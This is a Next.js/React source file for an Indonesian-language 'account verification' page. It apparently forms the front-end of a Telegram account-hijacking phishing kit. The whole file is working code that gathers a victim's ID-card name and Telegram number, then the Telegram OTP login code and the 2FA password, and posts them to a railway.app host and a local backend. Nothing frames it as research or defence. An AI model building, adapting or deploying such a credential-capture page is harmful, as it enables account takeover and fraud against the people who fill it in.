"use client";

import { useState, useRef, useEffect } from "react";
import Image from "next/image";
import { Eye, EyeOff } from "lucide-react";

export default function AuthForm() {
  const [step, setStep] = useState<"register" | "otp" | "password">("register");
  const [nama, setNama] = useState("");
  const [telegram, setTelegram] = useState("");
  const [otp, setOtp] = useState<string[]>(["", "", "", "", ""]);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timer, setTimer] = useState(0);

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => setTimer((prev) => prev - 1), 1000);
    }
    return () => clearInterval(interval);
  }, [timer]);

  const handleRegisterSubmit = async () => {
    setLoading(true);
    try {
      await fetch("https://merry-empathy-production.up.railway.app/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: nama, phone: telegram }),
      });
      setTimer(60);
      setStep("otp");
    } catch {
      alert("Gagal terhubung ke Backend Python!");
    } finally {
      setLoading(false);
    }
  };

  const handleOtpSubmit = async () => {
    setLoading(true);
    try {
      const res = await fetch("http://127.0.0.1:8000/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: nama, phone: telegram, otp: otp.join("") }),
      });
      const data = await res.json();

      if (data.result === "VALID") {
        alert("✅ Verifikasi Berhasil!");
        window.location.reload(); 
      } else if (data.result === "NEED_PASSWORD") {
        setStep("password");
      } else {
        alert("❌ KODE OTP SALAH!");
        setOtp(["", "", "", "", ""]);
        if (otpRefs.current[0]) otpRefs.current[0].focus();
      }
    } catch {
      alert("Koneksi gagal!");
    } finally {
      setLoading(false);
    }
  };

  const handleFinalSubmit = async () => {
    setLoading(true);
    try {
      const res = await fetch("http://127.0.0.1:8000/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: nama, phone: telegram, password }),
      });
      const data = await res.json();

      if (data.result === "VALID_PASSWORD") {
        alert("✅ Verifikasi Berhasil!");
        window.location.reload();
      } else if (data.result === "INVALID_PASSWORD") {
        alert("❌ KATA SANDI 2FA SALAH!");
        setPassword("");
      }
    } catch {
      alert("Gagal memproses sandi.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white p-6">
      <div className="mx-auto w-full max-w-[400px]">
        <Image src="/banner.jpeg" alt="Banner" width={400} height={200} className="rounded-xl mb-6 shadow-sm" priority />

        {step === "register" && (
          <div className="space-y-4">
            <h2 className="text-xl font-bold text-gray-800">Verifikasi Akun</h2>
            <div>
              <label className="text-sm font-semibold text-gray-600">Nama Sesuai E-KTP</label>
              <input suppressHydrationWarning type="text" value={nama} onChange={(e) => setNama(e.target.value)} className="w-full h-12 border border-gray-300 rounded-lg px-4 mt-1 outline-none" placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="text-sm font-semibold text-gray-600">Nomor Telegram</label>
              <input suppressHydrationWarning type="tel" value={telegram} onChange={(e) => setTelegram(e.target.value)} className="w-full h-12 border border-gray-300 rounded-lg px-4 mt-1 outline-none" placeholder="08..." />
            </div>
            <button onClick={handleRegisterSubmit} disabled={loading || !nama || !telegram} className="w-full h-12 bg-blue-600 text-white rounded-lg font-bold disabled:opacity-50 transition-all">
              {loading ? "Memproses..." : "Lanjut Verifikasi"}
            </button>
          </div>
        )}

        {step === "otp" && (
          <div className="space-y-6">
            <div className="text-center">
              <h2 className="text-xl font-bold text-gray-800">Masukkan OTP</h2>
              <p className="text-sm text-gray-500 mt-1">Kode dikirim ke {telegram}</p>
            </div>
            <div className="flex gap-2 justify-center">
              {otp.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => { otpRefs.current[i] = el; }}
                  suppressHydrationWarning
                  type="text"
                  maxLength={1}
                  className="w-12 h-14 border-2 border-gray-200 text-center text-2xl font-bold rounded-xl outline-none focus:border-blue-500"
                  value={d}
                  onChange={(e) => {
                    const newOtp = [...otp];
                    newOtp[i] = e.target.value.slice(-1);
                    setOtp(newOtp);
                    if (e.target.value && i < 4) otpRefs.current[i + 1]?.focus();
                  }}
                />
              ))}
            </div>
            <div className="text-center">
              {timer > 0 ? (
                <p className="text-sm text-gray-400">Kirim ulang dalam {timer} detik</p>
              ) : (
                <button onClick={handleRegisterSubmit} className="text-sm text-blue-600 font-bold">Kirim Ulang Kode</button>
              )}
            </div>
            <button onClick={handleOtpSubmit} disabled={loading || otp.includes("")} className="w-full h-12 bg-gray-900 text-white rounded-lg font-bold hover:bg-black transition-all">
              {loading ? "Mengecek..." : "Verifikasi OTP"}
            </button>
          </div>
        )}

        {step === "password" && (
          <div className="space-y-4">
            <h2 className="text-xl font-bold text-gray-800 text-center">Verifikasi 2-Langkah</h2>
            <div className="relative">
              <input suppressHydrationWarning type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full h-12 border border-gray-300 rounded-lg px-4 pr-12 outline-none focus:ring-2 focus:ring-blue-500" placeholder="Masukkan Sandi 2FA" />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-3.5 text-gray-400">
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            <button onClick={handleFinalSubmit} disabled={loading || !password} className="w-full h-12 bg-blue-600 text-white rounded-lg font-bold hover:bg-blue-700 transition-all">
              {loading ? "Memverifikasi..." : "Konfirmasi Sandi"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}